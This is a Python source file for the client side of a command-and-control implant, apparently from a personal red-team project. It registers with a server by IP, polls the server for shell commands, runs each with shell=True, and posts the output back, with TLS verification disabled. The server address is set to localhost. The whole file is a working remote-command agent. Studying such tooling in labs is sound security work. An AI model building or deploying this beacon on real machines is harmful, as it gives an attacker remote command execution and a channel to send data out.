import requests
import subprocess
import time
import platform

SERVER_URL = "http://127.0.0.1:5005"
CLIENT_ID = None

# client reaches out to server to get told its ID
def register():
    if (platform.system() == 'Darwin'): # mac
        ip = subprocess.run("ifconfig | grep 129 | grep inet | awk '{print $2}'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
    elif (platform.system() == "Linux"):
        ip = subprocess.run("hostname -I", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()

    # response = requests.get(f"{SERVER_URL}/log-client", params={'client_id': ip}, verify='/Users/leahk/workspace/projects/redteam/C2/cert.pem') # send ip
    response = requests.get(f"{SERVER_URL}/register-client", params={'client_id': ip}, verify=False)
    if response.status_code == 200:
        return response.json()['client_id'] # need server to return to the client what its ID is
    else:
        return None

def get_command():
    response = requests.get(f"{SERVER_URL}/command", params={'client_id': CLIENT_ID}, verify=False) # GET command from server
    if response.status_code == 200 and response.json().get('status') == 'sent': # if request was successful
        return response.json().get('command')
        # return response.json()['command']
    return None

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # execute shell command in a subprocess
        return result.stdout.decode() + result.stderr.decode() # decode standard output
    except subprocess.CalledProcessError as e: # umm uhh
        return str(e)

def main():
    global CLIENT_ID
    try:
        CLIENT_ID = register()
        # print("!!!!!!!!!!CLIENT ID:", CLIENT_ID)
        while True:
            cmd = get_command()
            if not cmd:
                time.sleep(5)
                continue
            if cmd == "disconnect":
                print(f"client {CLIENT_ID} disconnected")
                requests.post(SERVER_URL, params={'client_id': CLIENT_ID, 'status': 'disconnected'}) # this works too
                break
            result = execute_command(cmd)
            requests.post(SERVER_URL, json={"result": result}, params={'client_id': CLIENT_ID, 'status': 'connected'}) # this goes hard
            # print("hi from client")
            time.sleep(10)
    except Exception as e:
        print("*crickets*")
        print(e)

if __name__ == "__main__":
    main()